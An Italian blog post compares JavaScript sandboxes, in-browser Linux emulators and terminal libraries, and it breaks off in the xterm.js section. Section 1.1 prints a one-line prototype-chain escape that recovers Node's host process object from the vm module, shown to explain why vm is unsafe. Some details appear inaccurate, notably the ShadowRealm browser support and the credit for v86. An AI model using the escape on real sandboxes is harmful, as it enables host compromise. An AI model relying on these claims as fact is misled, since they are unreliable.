---
title: Confronto tra Soluzioni JavaScript per la Simulazione di Kernel Linux
description: Un'analisi approfondita delle ricreazioni di ambienti Linux in
  JavaScript/TypeScript.
date: 2026-05-28
tags:
  - javascript
  - linux
  - analysis
authors:
  - fox3000foxy
author_pubkey: "MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEqV85OoYmfrw0bJGMeZ44/qSkuMaKT2Qp6ofWK2lXdfL+Qf8MPA/6N02mca3/rfiVHBNWXZRRFRInbMY/w8FqtA=="
author_sig: "MEYCIQCPGnKCR74z5RUhKQppQNddkDWDj7KYfKIoa2MP+SEUyQIhAJOxc9ct/fz2LnZjIe/cHwcoH74p8f3zxGRV56l2U6t8"
---

# Ogni sandbox, emulatore, simulatore e honeypot JavaScript -- a confronto

Allora, sono stato fin troppo in fondo a questa tana del coniglio per un bel po'. È iniziato perché stavo aiutando con [typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container) -- un progetto di Fortune (ne parleremo tra poco) -- e continuavo a sentirmi chiedere "aspetta, in cosa è diverso da `v86`?" o "perché non usare semplicemente `vm2`?" -- e ho realizzato che non potevo dare una risposta chiara senza mappare prima l'intero ecosistema. Quindi eccoci qui, suppongo lol.

A quanto pare ci sono quattro famiglie distinte -- sandbox JS, emulatori Linux, simulatori Linux e honeypot -- e non si sovrappongono quasi mai, anche se vengono costantemente menzionate nello stesso discorso. Chi costruisce un sistema di plugin usa `isolated-vm`. Chi fa una demo di un tool CLI usa `v86`. Chi fa threat intelligence SSH usa Cowrie. Risolvono problemi completamente diversi sotto lo stesso vago ombrello di "eseguire codice in una scatola."

Ho passato un sacco di tempo a leggere codice sorgente, rapporti CVE, documentazione di architettura e pagine npm per scrivere questo. Sarà lunghissimo -- prenditi un caffè, sul serio. O due.

> Breve disclaimer: `typescript-virtual-container` è ampiamente citato in questo articolo perché è ciò che ha scatenato questa ricerca. Ho cercato di essere equo con tutto il resto, ma tieni presente questo contesto.

---

## Parte 0 -- Prima di tutto, che problema stai risolvendo?

Prima di immergerci, vale la pena essere precisi su a cosa serve ogni famiglia, perché la terminologia diventa rapidamente confusa e le persone le mischiano continuamente (compreso me, prima che mi sedessi e le mappassi per bene).

**Sandbox JS** isolano il codice JavaScript dal processo Node.js host. Il modello di minaccia è: codice JS non fidato che potrebbe chiamare `process.exit()`, leggere file o spawnare processi figli. La soluzione è un confine attorno all'esecuzione V8. Questi strumenti non hanno alcun concetto di shell Linux, filesystem con permessi o SSH.

**Emulatori Linux** eseguono un kernel Linux reale e non modificato all'interno di un emulatore CPU (x86, RISC-V, OR1K) implementato in JavaScript o WebAssembly. Avvii un vero sistema operativo. Ottieni vere syscall. Ottieni compatibilità binaria con programmi compilati per x86. Il sovraccarico è enorme.

**Simulatori Linux** fingono il *comportamento* di un sistema Linux senza eseguire un kernel reale. Implementano un interprete di shell, un filesystem virtuale e abbastanza semantica Unix da ingannare programmi e umani. Nessun kernel. Nessun Wasm. Nessuna emulazione CPU. Sovraccarico molto inferiore.

**Honeypot** sono costruiti per attirare attaccanti e registrare cosa fanno. Non sono principalmente ambienti di esecuzione -- sono strumenti di osservabilità. La fedeltà al comportamento Linux reale conta solo nella misura in cui impedisce all'attaccante di rilevare la trappola.

Con questa premessa, ecco dove si colloca ogni progetto in questo articolo:

```
Sandbox JS:        vm, vm2, isolated-vm, quickjs-emscripten, Deno Workers, ShadowRealm
Emulatori Linux:   v86, JSLinux/TinyEMU, jor1k, CheerpX, WebContainers, container2wasm
Simulatori Linux:  typescript-virtual-container (unico in questo spazio)
Honeypot:          Cowrie, Kippo, Lyrebird, endlessh, sshesame, node-simple-ssh-honeypot
Stack terminale:   xterm.js + node-pty (non un isolatore, ma affine)
```

---

## Parte 1 -- Sandbox JavaScript

### 1.1 `vm` -- il modulo integrato di Node.js (non è quello che pensi)

La risposta più vecchia a "esegui JS non fidato" in Node è il modulo `vm` integrato. C'è fin dalla v0.1, quindi molte persone lo usano per prime -- e poi vengono scottate.

```js
const vm = require("vm");
const sandbox = { answer: 0 };
vm.createContext(sandbox);
vm.runInContext("answer = 6 * 7", sandbox);
console.log(sandbox.answer); // 42
```

Cosa fa realmente `vm`: crea un nuovo contesto V8 (un set fresco di costruttori built-in -- `Object`, `Array`, `Function`, ecc.) ed esegue codice al suo interno, con un riferimento condiviso a ciò che metti in `sandbox`. Il tuo motore V8 non cambia. Il tuo processo non cambia. La memoria è condivisa.

Il motivo per cui `vm` non fornisce sicurezza: la catena di prototipi di JavaScript è un DAG che collega tutto a `Object.prototype`. Se metti un qualsiasi oggetto dal realm host nella sandbox, l'ospite può risalire la sua catena di prototipi e raggiungere i costruttori host. Da `Function`, puoi chiamare `Function("return process")()` e recuperare il vero oggetto `process`. Game over. Immediatamente.

```js
// Questo funziona perfettamente in vm -- ottieni il vero oggetto process
vm.runInNewContext(`({}).__proto__.constructor("return process")()`);
```

Cioè, la documentazione di Node.js stessa dice: "Il modulo vm non è un meccanismo di sicurezza. Non usarlo per eseguire codice non fidato." Questo avviso c'è da sempre. La gente lo ignora costantemente. Ho visto app di produzione usare `vm` come sandbox. Per favore, non fatelo xD

**Verdetto**: un meccanismo di scope, non una sandbox. Usalo quando ti serve un ambito di variabili isolato (template engine, funzioni simili a `eval` dove controlli il codice). Mai per input non fidato.

**Memoria**: overhead trascurabile -- stesso heap V8 del processo host.  
**Sicurezza**: nessuna contro un attaccante motivato.

---

### 1.2 `vm2` -- il tentativo della community, e la sua lunghissima morte

`vm2` era la risposta della community al problema di fuga di `vm`. L'idea centrale: avvolgere ogni oggetto che attraversa il confine della sandbox in un `Proxy` che intercetta l'accesso alle proprietà, blocca la risalita del prototipo e filtra i riferimenti pericolosi. Idea intelligente in teoria! Non così tanto nella pratica, come vedremo.

```js
const { VM } = require("vm2");
const vm = new VM({ timeout: 1000, sandbox: {} });
vm.run("process.exit(1)"); // throws VMError, process not accessible
```

Per diversi anni ha funzionato ragionevolmente bene. Ma la superficie d'attacco di un `Proxy` JavaScript è enorme. Ogni nuova funzionalità del linguaggio JS -- generatori, iteratori asincroni, `Symbol.toPrimitive`, `Error.prepareStackTrace`, slot interni di `Promise` -- è un potenziale vettore di bypass.

La timeline delle CVE è... qualcosa. Tipo, guarda questa:

| Data | CVE | Meccanismo |
|------|-----|-----------|
| Ott 2022 | CVE-2022-36067 | Fuga dal contesto host `Error.prepareStackTrace` |
| Apr 2023 | CVE-2023-29017 | Perdita di oggetti host tramite stack di errori async non gestiti |
| Apr 2023 | CVE-2023-29199 | Bypass della sanitizzazione delle eccezioni tramite `handleException()` |
| Apr 2023 | CVE-2023-30547 | `Proxy.getPrototypeOf` → `Function` → RCE |
| Mag 2023 | CVE-2023-32314 | `Proxy` su `Error.name` → `Function` → RCE |
| Lug 2023 | CVE-2023-37466 | Funzione async + stack overflow + `Proxy.getPrototypeOf` |
| Lug 2023 | CVE-2023-37903 | Worker thread + fuga eval |

Tre CVE critiche nello stesso mese (aprile 2023). TRE. IN UN MESE. Dopo CVE-2023-37903, il maintainer ha ufficialmente deprecato la libreria con il messaggio: *"La libreria contiene problemi di sicurezza critici e non dovrebbe essere usata in produzione."*

Il maintainer l'ha resuscitata nell'ottobre 2025 con la versione 3.10.0, sostenendo di aver risolto tutto ciò che era noto all'epoca. Una nuova fuga critica (CVE-2026-22709, CVSS 9.8) è stata divulgata nel gennaio 2026, seguita da un lotto di altre undici nel maggio 2026. Undici. Il modello non è cambiato e onestamente non credo che cambierà mai.

Il problema fondamentale è architetturale -- e questa è la lezione che l'intero ecosistema ha impiegato un po' per imparare. Non puoi costruire una sandbox sicura usando lo stesso linguaggio che stai sandboxando, sullo stesso motore, nello stesso processo. La superficie di fuga è l'intera implementazione di V8 -- e V8 sono diversi milioni di righe di C++ che continuano a cambiare. Ogni nuova funzionalità JS apre potenzialmente un nuovo percorso d'attacco.

**Verdetto**: Non usare per applicazioni sensibili alla sicurezza. Anche nell'ultima versione, nuovi bypass vengono scoperti ogni pochi mesi. Il maintainer stesso lo ha riconosciuto apertamente.

---

### 1.3 `isolated-vm` -- quello che funziona davvero

`isolated-vm` adotta l'approccio corretto: usare il primitivo di isolamento di V8, l'Isolate. Ogni V8 Isolate ha il proprio heap, il proprio garbage collector, il proprio set di built-in e zero riferimenti condivisi con altri Isolate.

Questo è lo stesso confine che Chrome usa tra le schede. È un vero confine di sicurezza, non un trucco a livello di linguaggio basato su Proxy.

```js
import ivm from "isolated-vm";

// Each isolate is its own V8 heap
const isolate = new ivm.Isolate({ memoryLimit: 64 }); // MB cap
const context = await isolate.createContext();
const jail = context.global;

// Passing data across the boundary requires explicit serialization
await jail.set("sensitiveData", "not this");
await jail.set("log", new ivm.Reference(console.log));

const script = await isolate.compileScript(`
  // Can't reach host process, host heap, or host modules
  log.applySync(undefined, ["hello from the isolate"]);
`);
await script.run(context);

// You can hard-terminate on timeout or memory limit
isolate.dispose(); // frees the entire heap
```

I tipi `Reference` e `ExternalCopy` sono il ponte di comunicazione esplicito. Una `Reference` dà all'isolate un handle chiamabile a una funzione host -- l'isolate può chiamarla ma non può ispezionare la sua closure o il suo prototipo. Un `ExternalCopy` serializza un valore (structured clone) attraverso il confine dell'heap. Questo modello a ponte esplicito non è comodo, ma è ciò che rende reale l'isolamento.

Puoi impostare limiti di risorse rigidi: memoria (l'isolate viene terminato se supera il limite), timeout a tempo reale e timeout CPU. La terminazione è reale -- uccide l'intero V8 Isolate, non solo un timeout JS che può essere bypassato con un `while(true)`.

**Limitazioni**: solo JS. Non puoi eseguire bash al suo interno. Non c'è concetto di file, permessi, rete o processi. È esattamente lo strumento giusto per JS inviato dall'utente (plugin, formule, script hook), e lo strumento sbagliato per tutto il resto. L'autrice di `typescript-virtual-container` ha menzionato di averlo considerato all'inizio prima di rendersi conto che "eseguire comandi shell" e "isolare JavaScript" sono problemi fondamentalmente diversi.

**Memoria**: ~3–10 MB per isolate vuoto, cresce con l'uso dell'heap.  
**Sicurezza**: forte. Il confine V8 Isolate è il primitivo di isolamento reale.  
**npm**: [isolated-vm](https://www.npmjs.com/package/isolated-vm)  
**GitHub**: [laverdet/isolated-vm](https://github.com/laverdet/isolated-vm)

---

### 1.4 `quickjs-emscripten` -- un motore JS separato compilato in Wasm

Un approccio diverso: invece di isolare all'interno di V8, esegui un motore JavaScript completamente separato compilato in WebAssembly. L'host esegue V8/Node. L'ospite esegue QuickJS-in-Wasm. La sandbox Wasm fornisce il confine di isolamento.

QuickJS è di nuovo lavoro di Fabrice Bellard (lo stesso tizio dietro QEMU, FFmpeg, JSLinux, TinyEMU -- questa persona non è reale, come fa una singola persona a fare tutto questo?). È un motore JS piccolo e conforme alle specifiche ES2023 scritto in C, e quando compilato in Wasm è solo ~500 KB.

```js
import { getQuickJS } from "quickjs-emscripten";

const QuickJS = await getQuickJS();
const vm = QuickJS.newContext();

const result = vm.evalCode(`
  // Runs in QuickJS, completely separate from V8
  (function() { return 6 * 7; })()
`);

if (result.error) {
  console.log("Error:", vm.dump(result.error));
  result.error.dispose();
} else {
  console.log("Result:", vm.dump(result.value)); // 42
  result.value.dispose();
}

vm.dispose();
```

QuickJS è un motore JavaScript ES2023 piccolo e conforme alle specifiche scritto in C. Compilato in Wasm, è ~500 KB per la variante sincrona, ~1 MB per quella asincrona (Asyncify). La gestione della memoria è manuale -- ogni valore che estrai dalla VM deve essere esplicitamente smaltito, il che è un po' fastidioso ma previene sorprese GC oltre il confine. Un compromesso interessante!

Il wrapper `@sebastianwessel/quickjs` aggiunge un'API più ergonomica sopra, con filesystem virtuale opzionale, supporto fetch e stub dei moduli Node.js:

```ts
import variant from "@jitl/quickjs-ng-wasmfile-release-sync";
import { loadQuickJs } from "@sebastianwessel/quickjs";

const { runSandboxed } = await loadQuickJs(variant);

const result = await runSandboxed(
  async ({ evalCode }) => evalCode(`
    import { join } from 'path';
    export default join('src', 'dist');
  `),
  { allowFs: false, allowFetch: false }
);
```

Il modello di sicurezza è diverso da `isolated-vm`: il modello di memoria lineare di Wasm significa che l'ospite non può accedere direttamente agli oggetti heap di V8. La superficie d'attacco è l'interfaccia host↔Wasm (import/export), non l'intero linguaggio JS. Questo è generalmente considerato più robusto del sandboxing basato su Proxy.

Il problema: QuickJS non ha lo stesso livello di ottimizzazione di V8. Per carichi di lavoro JS CPU-bound, è 5–20x più lento di V8. Per brevi frammenti e eval non fidati, di solito non importa.

**Memoria**: ~500 KB modulo Wasm + heap per istanza.  
**Sicurezza**: confine Wasm, considerato più forte degli approcci basati su Proxy.  
**npm**: [quickjs-emscripten](https://www.npmjs.com/package/quickjs-emscripten), [@sebastianwessel/quickjs](https://www.npmjs.com/package/@sebastianwessel/quickjs)  
**GitHub**: [justjake/quickjs-emscripten](https://github.com/justjake/quickjs-emscripten)

---

### 1.5 Deno -- runtime con permessi come priorità

Deno adotta una filosofia completamente diversa: invece di creare sandbox in Node, costruisci un nuovo runtime che sia sicuro per impostazione predefinita. Mi piace molto questo approccio -- è ciò che Node.js avrebbe dovuto essere fin dall'inizio, onestamente. Ryan Dahl (il creatore originale di Node.js) ha letteralmente creato Deno perché si rammaricava di alcune decisioni di design di Node.js, il che è piuttosto pazzesco se ci pensi.

Ogni capacità sensibile (lettura file, scrittura file, rete, env, sotto-processi) richiede un flag `--allow-*` esplicito:

```bash
# Questo può solo leggere da /data, nient'altro
deno run --allow-read=/data script.ts

# Questo può fare fetch solo a un dominio
deno run --allow-net=api.example.com script.ts

# Nessun flag = nessun permesso
deno run untrusted.ts # can't read, write, network, spawn
```

Il modello di permessi è implementato a livello Rust/OS -- non è un trucco JS. Quando il codice Deno chiama `Deno.readFile()`, passa attraverso un'op Rust che controlla la tabella dei permessi prima di toccare il filesystem. Non puoi bypassarlo da JS perché la syscall non avviene mai se il permesso non è concesso.

Per eseguire codice veramente non fidato, i Deno Workers (Web Workers) forniscono un secondo isolate all'interno dello stesso processo, ognuno con il proprio set di permessi. Puoi spawnare un worker con zero permessi e comunicare con esso tramite `postMessage`.

Deno 2 (rilasciato nell'ottobre 2024) ha aggiunto la piena compatibilità npm e shim di compatibilità Node.js, migliorando significativamente la sua adozione per casi d'uso lato server.

**Il compromesso**: il modello di sicurezza di Deno è eccellente per codice di cui potresti fidarti parzialmente. Per codice completamente non fidato che potrebbe essere ostile, il modello di permessi non aiuta -- hai bisogno di un confine Isolate (`isolated-vm`) o di un motore diverso (`quickjs-emscripten`), perché Deno esegue ancora V8 e attaccanti sofisticati possono trovare bug a livello V8.

---

### 1.6 TC39 ShadowRealm -- la risposta standard (alla fine)

L'organismo di standardizzazione JavaScript (TC39) ha una proposta chiamata ShadowRealm che tenta di standardizzare ciò che `vm` e `vm2` cercavano di fare, ma con un modello di sicurezza corretto. Uno ShadowRealm crea un contesto di esecuzione JS isolato con il proprio set di intrinsic, nessun accesso al realm esterno e un'interfaccia import/export attentamente controllata.

```js
const realm = new ShadowRealm();
const result = realm.evaluate(`
  // Separate intrinsics, no access to outer realm
  typeof globalThis.fetch // "undefined"
  6 * 7 // 42
`);
```

ShadowRealm è nei browser (Chrome 90+, Firefox 105+) ma a partire dal 2026 non è ancora in Node.js stabile. La proposta TC39 Compartments si basa su di esso per l'isolamento a livello di modulo. Queste sono le risposte standardizzate a lungo termine, ma non sono ancora pronte per la produzione per casi d'uso Node.js lato server. È una di quelle cose che vedi arrivare da lontano ma semplicemente... non è ancora qui. Classico TC39 xD

---

### Riepilogo della famiglia sandbox

| | `vm` | `vm2` | `isolated-vm` | `quickjs-emscripten` | Deno Workers |
|---|---|---|---|---|---|
| **Confine isolamento** | nessuno (solo scope) | Proxy (rotto) | V8 Isolate | Wasm | V8 Isolate + permessi Rust |
| **Limite memoria** | ❌ | ❌ | ✅ limite rigido | ✅ heap Wasm | parziale |
| **Timeout CPU** | ❌ | ✅ (bypassabile) | ✅ rigido | ✅ | ✅ |
| **Sicurezza** | nessuna | rotta | forte | forte | forte |
| **Velocità JS** | V8 nativo | V8 nativo | V8 nativo | ~10x più lento | V8 nativo |
| **Browser** | ❌ | ❌ | ❌ | ✅ | ❌ |
| **Compatibilità Node** | nativa | ✅ | ✅ | shim parziali | parziale |
| **Stato** | stabile | rischioso (nuove CVE) | ✅ attivo | ✅ attivo | ✅ attivo |
| **Overhead RAM** | ~1 MB | ~5–20 MB | ~3–10 MB | ~5–15 MB | ~10–30 MB |

Il messaggio da portare a casa: se ti interessa la sicurezza, ci sono esattamente due opzioni reali -- `isolated-vm` (addon nativo, V8 Isolate, piena velocità JS) e `quickjs-emscripten` (Wasm, compatibile browser, ~10x più lento per codice compute-intensive). Tutto il resto è o "per favore non farlo" (`vm`, `vm2`) o un runtime che risolve un problema completamente diverso (Deno). ShadowRealm potrebbe cambiare questo quadro eventualmente, ma non è ancora pronto.

---

## Parte 2 -- Emulatori Linux in JavaScript

Qui è dove le cose diventano davvero interessanti per me. Questi sono *veri* emulatori -- implementano un set di istruzioni CPU in JavaScript o WebAssembly, avviano una vera immagine del kernel Linux, ed eseguono veri binari userland. L'isolamento deriva dal fatto che ospite e host non condividono nulla: diversi spazi di memoria, diversi flussi di istruzioni.

Il prezzo che paghi è enorme, ma la cosa che ottieni è genuinamente notevole: vero Linux, che gira davvero, nel tuo browser o processo Node. Cioè, è piuttosto pazzesco se ci pensi, no?

### 2.1 `v86` -- Emulatore PC x86 in JS + JIT Wasm

`v86` di Fabrice (copy su GitHub) è l'emulatore x86 open-source più capace in JavaScript. È iniziato come un interprete JS puro intorno al 2013 e si è evoluto in un sistema JIT dove i blocchi di base x86 vengono tradotti in WebAssembly al volo, migliorando drasticamente le prestazioni.

Cosa emula:
- **CPU**: x86-32 (IA-32), set di istruzioni approssimativamente a livello Pentium 1. Nessun supporto 64-bit (x86-64) -- questo è un limite architetturale, non una funzionalità mancante.
- **FPU**: tramite `Float64Array` di JavaScript. x87 è a precisione estesa 80-bit; i double JS sono a 64-bit. Questo significa che i risultati in virgola mobile possono differire leggermente da una CPU reale.
- **Memoria**: configurabile, mappata a un `SharedArrayBuffer` o `ArrayBuffer` nell'heap JS.
- **Hardware**: 8254 PIT (timer), 8259 PIC (controllore interrupt), 8042 controller tastiera (PS/2), CMOS RTC, VGA con estensioni SVGA e Bochs VBE, controller IDE, controller floppy (8272A), scheda di rete NE2000.
- **BIOS**: usa SeaBIOS (BIOS x86 open source).

Il JIT funziona identificando blocchi di base (sequenze di istruzioni x86 senza salti), traducendoli in una funzione WebAssembly, memorizzando nella cache quella funzione, e chiamandola nelle esecuzioni successive dello stesso blocco. I percorsi di codice caldo ottengono prestazioni Wasm native. I percorsi freddi ripiegano sull'interprete JS.

```js
import { V86 } from "v86";
import { readFileSync } from "fs";

const emulator = new V86({
  bios:    { buffer: readFileSync("./bios/seabios.bin") },
  vga_bios:{ buffer: readFileSync("./bios/vgabios.bin") },
  hda:     { buffer: readFileSync("./images/alpine.img"), async: false },
  memory_size: 128 * 1024 * 1024, // 128 MB
  autostart: true,
});

// Capture serial output (Linux kernel console)
emulator.add_listener("serial0-output-byte", byte => {
  process.stdout.write(String.fromCharCode(byte));
});

// Send input to the guest (type into the shell)
emulator.serial0_send("ls /\n");
```

**Sistemi operativi supportati**: Alpine Linux (eccellente), Ubuntu 16.04/18.04 (solo i386), Arch Linux 32, ReactOS, FreeDOS, Windows 9x/2000 (con limitazioni), MS-DOS.

**Tempo di avvio**: 15–40 secondi per Alpine Linux da un'immagine pulita. Questo è inerente all'inizializzazione reale del kernel -- non puoi saltarla. Sì, i tuoi utenti rimarranno seduti a guardare una sequenza di boot del kernel nel loro browser. È così xD

**Consumo memoria**: 100–256 MB per istanza. La cache JIT Wasm da sola può raggiungere decine di MB per un'istanza Linux attiva.

**Uso in Node.js**: pienamente supportato. Nessun DOM necessario -- l'output VGA può essere scartato se ti interessa solo la seriale.

**Cosa non puoi fare**: eseguire binari 64-bit, usare funzionalità moderne del kernel (eBPF, io_uring, ecc.), o eseguire più di una manciata di istanze contemporaneamente senza raggiungere i limiti di memoria.

**npm**: [v86](https://www.npmjs.com/package/v86) -- aggiornato continuamente, ultima pubblicazione entro l'ultimo giorno al momento della scrittura.  
**GitHub**: [copy/v86](https://github.com/copy/v86)  
**Demo**: [copy.sh/v86](https://copy.sh/v86)

---

### 2.2 JSLinux e TinyEMU -- il lavoro di Bellard, due volte

JSLinux è l'emulatore Linux JavaScript di Fabrice Bellard -- il primo in assoluto, pubblicato nel 2011. Continuo a menzionare Bellard in questo articolo perché continua a spuntare fuori: QuickJS, TinyEMU, JSLinux, QEMU, FFmpeg. Quest'uomo è qualcosa d'altro. Genuinaramente uno dei contributi tecnici individuali più impressionanti nella storia del software, senza esagerazione.

L'originale JSLinux era un interprete x86 JS puro. Nel 2016, Bellard ha scritto TinyEMU (un emulatore RISC-V in C), lo ha compilato in JavaScript tramite Emscripten, e questo è diventato la base per l'attuale JSLinux. Quindi l'attuale JSLinux è in realtà codice C che genera JavaScript -- non JS scritto a mano.

Le note tecniche sul sito di Bellard meritano una lettura: l'attuale JSLinux esegue una CPU RISC-V a 32 o 64-bit (non x86), emulando VirtIO console, VirtIO network, VirtIO block device e un filesystem 9P per la condivisione di file con l'host. La demo JS è compilata da C usando Emscripten -- non è JS scritto a mano.

TinyEMU stesso supporta:
- RISC-V RV32IMAFDQC e RV64IMAFDQC (32 e 64-bit, con float, moltiplicazione, istruzioni compresse)
- x86 tramite KVM (solo nativo, nessuna emulazione -- quindi la versione JS è solo RISC-V)
- VirtIO console, network, block, input, filesystem 9P

TinyEMU ha una demo JavaScript fornita tramite Emscripten. È la base per JSLinux ed è anche usato da `container2wasm` (vedi sezione 2.5).

**Stato JSLinux**: nessun pacchetto npm, nessuna API programmatica. È una demo che apri nel browser. Il significato storico è alto -- ha dimostrato il concetto. Utilizzo pratico come libreria: nessuno.

**TinyEMU**: non su npm, sorgente C disponibile su [bellard.org/tinyemu](https://bellard.org/tinyemu/).

---

### 2.3 jor1k -- Emulatore OR1K

jor1k è un emulatore OpenRISC 1000 (OR1K) scritto in JavaScript da Sebastian Macke. È interessante storicamente perché jor1k ha introdotto il supporto VirtIO 9P, che Bellard ha successivamente incorporato in TinyEMU e JSLinux. L'impollinazione incrociata tra questi progetti è stretta -- si prendono in prestito a vicenda, che è onestamente una delle cose più fighe del lavoro di emulazione open source.

**Stato**: non più mantenuto attivamente, nessun pacchetto npm. Archiviato a questo punto. Vale la pena conoscerlo principalmente per contesto storico -- tipo se qualcuno menziona jor1k in una conversazione, ora sai cos'è :)

---

### 2.4 CheerpX -- Emulatore x86 commerciale per browser

CheerpX di Leaning Technologies è l'emulatore Linux x86 commerciale di livello produzione. Non è open source, ma è significativamente più capace di v86 per eseguire un vero userland Debian/Ubuntu. Se hai bisogno di un vero VSCode nel browser, è questo che usi.

Differenze chiave da v86:
- Supporta un ISA più ampio (più estensioni x86, migliore compatibilità glibc)
- Filesystem basato su IndexedDB nel browser (persistente tra ricariche di pagina)
- Supporto pthread tramite `SharedArrayBuffer` (che richiede header COOP/COEP -- sì, quei fastidiosi header di sicurezza)
- Progettato per eseguire VSCode, Python, Node.js e altre applicazioni reali -- non solo immagini OS minime
- Supporto professionale e SLA disponibile (ovvero puoi urlare a qualcuno se si rompe)

Il caso d'uso tipico è "esegui una vera applicazione Linux nel browser senza server." Le aziende lo usano per IDE basati su browser, tutorial di programmazione e documentazione interattiva.

```js
// CheerpX API (semplificata)
const cx = await CheerpX.Linux.create({
  mounts: [{ type: "ext2", path: "/", dev: CloudDevice.create(...) }],
});
await cx.run("/bin/bash");
```

**Storia Node.js**: CheerpX è browser-first. L'emulatore sottostante potrebbe teoricamente funzionare in Node (è Wasm), ma l'API e la documentazione sono orientate interamente all'uso nel browser. L'uso lato server non è supportato.

**Memoria**: simile a v86 -- 200+ MB per un'istanza Debian reale.  
**Prezzi**: gratuito per progetti open source, licenza commerciale per SaaS di produzione.  
**Documentazione**: [cheerpx.io/docs/overview](https://cheerpx.io/docs/overview)

---

### 2.5 WebContainers (StackBlitz) -- Node.js in Wasm, non emulazione Linux

I WebContainers sono spesso raggruppati con gli emulatori Linux ma sono architetturalmente diversi. Non emulano x86. Non avviano Linux. Eseguono Node.js compilato in WebAssembly usando WASI. Questa distinzione conta molto e ci sono rimasto confuso per troppo tempo lol.

Penso che la confusione venga dal marketing -- "esegui Node.js nel tuo browser" suona come emulazione, ma in realtà è Node.js stesso compilato in Wasm, non emulazione Linux che esegue Node.js dentro una VM. Roba completamente diversa.

L'architettura:
1. Node.js è compilato in Wasm (specificamente un runtime WASI personalizzato)
2. Un Service Worker intercetta le richieste di rete dal server Node.js emulato e le instrada alla scheda del browser
3. Il filesystem vive nella memoria del browser (nessun I/O su disco)
4. npm è un'implementazione personalizzata ottimizzata per l'uso nel browser

```js
import { WebContainer } from "@webcontainer/api";

const webcontainer = await WebContainer.boot();

// Write files
await webcontainer.mount({
  "index.js": { file: { contents: `console.log("hello")` } },
  "package.json": { file: { contents: `{"name":"demo","type":"module"}` } }
});

// Run Node.js commands
const proc = await webcontainer.spawn("node", ["index.js"]);
proc.output.pipeTo(new WritableStream({ write: chunk => console.log(chunk) }));
```

Poiché esegue Node.js reale (compilato in Wasm), ottieni vero npm, vere API Node.js e vera risoluzione dei moduli. Non ottieni un userland Linux per uso generico -- non puoi installare pacchetti di sistema con `apt`, eseguire binari compilati arbitrari o fare molto al di fuori dell'ecosistema Node.js.

**Requisiti browser**: SharedArrayBuffer (richiede header COOP/COEP), supporto Service Worker, Wasm moderno.

**Storia Node.js**: progettato esclusivamente per l'uso nel browser. L'API non funziona al di fuori di un contesto browser.

**npm**: [@webcontainer/api](https://www.npmjs.com/package/@webcontainer/api)  
**Documentazione**: [webcontainers.io](https://webcontainers.io)

---

### 2.6 container2wasm -- Container Docker compilati in Wasm

`container2wasm` è uno strumento (non un pacchetto npm) di NTT che prende un'immagine container Docker e la converte in un binary WebAssembly che può essere eseguito in qualsiasi host Wasm -- incluso un browser. Quando l'ho visto per la prima volta, non credevo davvero funzionasse.

Il meccanismo:
- Per container x86_64: incorpora Bochs (un emulatore x86, compilato in Wasm) + il filesystem root del container
- Per container riscv64: incorpora TinyEMU (di nuovo Bellard!) + il filesystem root del container
- Il file `.wasm` risultante avvia l'emulatore, monta il filesystem del container ed esegue l'entrypoint del container

```bash
# Convert Ubuntu 22.04 container to Wasm
c2w ubuntu:22.04 out.wasm

# Run it
wasmtime out.wasm uname -a
# Linux 5.15.0 #1 SMP riscv64 GNU/Linux

# Or serve it for browser use
c2w --to-js ubuntu:22.04 /tmp/htdocs/
```

Il `.wasm` risultante è grande -- un'Ubuntu minima è diverse centinaia di MB -- ma è completamente autonomo. Puoi inviare via email un `.wasm` a qualcuno e loro possono eseguire Ubuntu nel loro browser. Questa frase non dovrebbe avere senso ma eccoci qui.

**GitHub**: [container2wasm/container2wasm](https://github.com/container2wasm/container2wasm)

---

### Riepilogo della famiglia emulatori

| | `v86` | JSLinux/TinyEMU | jor1k | CheerpX | WebContainers | container2wasm |
|---|---|---|---|---|---|---|
| **Architettura** | x86-32 JIT→Wasm | RISC-V (Wasm) | OR1K (JS) | x86 (proprietario) | Node.js→Wasm/WASI | x86/RISC-V (Wasm) |
| **Kernel reale** | ✅ | ✅ | ✅ | ✅ | ❌ (Node.js) | ✅ |
| **64-bit** | ❌ | ✅ (RISC-V) | ❌ | ✅ | n/a | ✅ |
| **Pacchetto npm** | ✅ | ❌ | ❌ | CDN/API | ✅ | ❌ (strumento CLI) |
| **Uso Node.js** | ✅ | ❌ | ❌ | ❌ | ❌ (solo browser) | tramite Wasmtime |
| **Uso browser** | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
| **RAM/istanza** | 150–256 MB | ~64–128 MB | ~64 MB | 200+ MB | ~100 MB | ~200–500 MB |
| **Tempo avvio** | 15–40s | 10–30s | 10–30s | 15–40s | 2–5s | 10–40s |
| **Open source** | ✅ | ✅ | ✅ | ❌ | parziale | ✅ |
| **Stato** | ✅ molto attivo | ✅ stabile | ⚠️ archiviato | ✅ commerciale | ✅ attivo | ✅ attivo |

La cosa che salta all'occhio da questa tabella: `v86` è l'unico che è un pacchetto npm, funziona sia in browser che Node, ed è open source. Ecco perché domina la conversazione sugli "emulatori Linux JavaScript." Tutto il resto ha qualche intoppo -- JSLinux non ha API, jor1k è archiviato, CheerpX costa soldi, WebContainers è solo browser e specifico per Node, container2wasm richiede un passaggio di build e una CLI. Se hai solo bisogno di "avviare Linux in JavaScript", `v86` è quasi sempre il punto di partenza giusto.

---

## Parte 3 -- Stack terminale: xterm.js e node-pty

Due pacchetti compaiono costantemente quando le persone costruiscono esperienze shell-like. Non sono sandbox o emulatori -- sono l'interfaccia utente e la componentistica PTY -- ma sono così affini che mi sentirei male a escluderli. Inoltre li ho usati entrambi e sono davvero buoni.

### 3.1 `xterm.js` -- il renderer di terminale

xterm.js è un emulatore di terminale per il browser. Renderizza una schermata di terminale (sequenze di escape VT100/xterm) in un elemento `<canvas>`, gestisce l'input da tastiera ed espone un'API per il piping dei dati in entrata e in uscita.

Usato da: terminale integrato di VS Code, Azure Cloud Shell, Proxmox VE, AWS CloudShell e molti altri.

```js
import { Terminal } from "@xterm/xterm";
import { FitAddon } from "@xterm/addon-fit";

const term = new Terminal({ cursorBlink: true });
const fitAddon = new FitAddon();
term.loadAddon(fitAddon);
term.open(document.getElementById("terminal"));
fitAddon.fit();

// Send data to the terminal (rendered as text)
term.write("$ ");
term.onData(data => {
  // data is keystrokes -- send to your backend
  socket.send(data);
});
socket.onmessage(msg => {
  // output from backend -- display it
  term.write(msg.data);
});
```

